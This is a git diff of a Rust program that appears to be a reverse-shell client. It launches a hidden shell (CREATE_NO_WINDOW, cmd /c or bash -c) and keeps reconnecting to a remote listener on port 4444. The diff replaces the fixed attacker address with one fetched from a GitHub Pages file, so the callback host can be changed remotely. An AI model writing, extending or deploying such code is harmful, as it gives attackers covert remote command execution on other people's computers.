@@ -9,6 +9,8 @@ use std::{
     time::Duration,
     os::windows::process::CommandExt
 };
+use reqwest::Error;
+
 
 #[cfg(target_os = "windows")]
 const SHELL: [&str; 2] = ["cmd", "/c"];
@@ -17,9 +19,18 @@ const SHELL: [&str; 2] = ["bash", "-c"];
 
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
+#[tokio::main]
+async fn fetch_url() -> Result<String, Error> {
+    let request_url = format!("https://khaiyuanyap.github.io/rmsh/metadata/ip.txt");
+    let response = reqwest::get(&request_url).await?;
+    let body = response.text().await?;
+    Ok(body)
+}
+
 fn main() {
+    let remote_ip = fetch_url().expect("Failed to fetch remote IP");
     loop {
-        match TcpStream::connect("192.168.1.10:4444") {
+        match TcpStream::connect(remote_ip.to_string()) {
             // Will change to something that can be remotely read from
             Err(_) => {
                 thread::sleep(Duration::from_millis(5000));
